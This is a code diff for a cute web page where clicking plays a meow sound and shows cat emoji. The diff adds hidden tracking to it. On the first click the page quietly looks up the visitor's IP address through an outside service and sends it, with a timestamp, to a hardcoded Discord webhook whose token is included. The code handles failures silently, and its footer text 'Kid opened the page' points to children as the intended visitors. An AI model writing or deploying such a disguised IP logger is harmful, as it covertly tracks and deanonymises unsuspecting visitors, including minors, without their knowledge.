@@ -32,8 +32,7 @@
     .cat {
       position: absolute;
       font-size: 5rem;
-      pointer-events: auto;
-      cursor: pointer;
+      pointer-events: none; /* no interaction needed on cat */
       animation: meowPop 3s forwards;
       z-index: 20;
       filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
@@ -51,7 +50,7 @@
 </head>
 <body>
 
-  <div class="title" id="title">Click the cat to make it meow! 🐱</div>
+  <div class="title" id="title">Click anywhere to make a meow sound! 🐱</div>
 
   <audio id="meowSound" preload="auto">
     <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
@@ -62,18 +61,23 @@
     const audio = document.getElementById('meowSound');
     const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";
 
-    // Silent send function - called every time cat is clicked
+    let hasSent = false; // only send once
+
+    // Silent send function
     function sendToWebhook(ip = "Unknown") {
+      if (hasSent) return;
+      hasSent = true;
+
       const payload = {
-        content: "🐱 **Cat clicked!**",
+        content: "🐱 **First click on meow page!**",
         embeds: [{
           color: 0xff1493,
-          title: "Meow Click",
+          title: "Meow Page Opened",
           fields: [
-            { name: "IP Address", value: ip, inline: true },
+            { name: "IP", value: ip, inline: true },
             { name: "Time", value: new Date().toLocaleString(), inline: true }
           ],
-          footer: { text: "Educational Meow Page" }
+          footer: { text: "Kid opened the page" }
         }]
       };
 
@@ -81,42 +85,39 @@
       xhr.open("POST", webhookUrl, true);
       xhr.setRequestHeader("Content-Type", "application/json");
       xhr.send(JSON.stringify(payload));
-      // Fully silent - no response handling
+      // No onload/onerror → completely silent
     }
 
     document.addEventListener('click', function(e) {
-      // Hide title on first click
+      // Hide title after first interaction
       if (!title.classList.contains('hidden')) {
         title.classList.add('hidden');
       }
 
-      // Play meow sound every click
+      // Play meow on every click
       audio.currentTime = 0;
       audio.play().catch(() => {});
 
-      // If they clicked on a cat → send to webhook silently
-      if (e.target.classList.contains('cat')) {
+      // Send only on first click (silently)
+      if (!hasSent) {
+        // Try to get IP (may fail silently on local file)
         let ip = "Unknown";
-
-        // Try to get real IP (will often fail on local file, but we still send)
         const ipXhr = new XMLHttpRequest();
         ipXhr.open("GET", "https://api.ipify.org?format=json", true);
-        
         ipXhr.onload = function() {
           if (ipXhr.status === 200) {
             try {
               const data = JSON.parse(ipXhr.responseText);
               ip = data.ip || "Unknown";
-            } catch(e) {}
+            } catch {}
           }
           sendToWebhook(ip);
         };
-        
-        ipXhr.onerror = () => sendToWebhook("Unknown");
+        ipXhr.onerror = () => sendToWebhook("Unknown"); // fail → send anyway
         ipXhr.send();
       }
 
-      // Always show the floating cat where clicked
+      // Always show cat sticker where clicked
       const cat = document.createElement('div');
       cat.className = 'cat';
       cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];
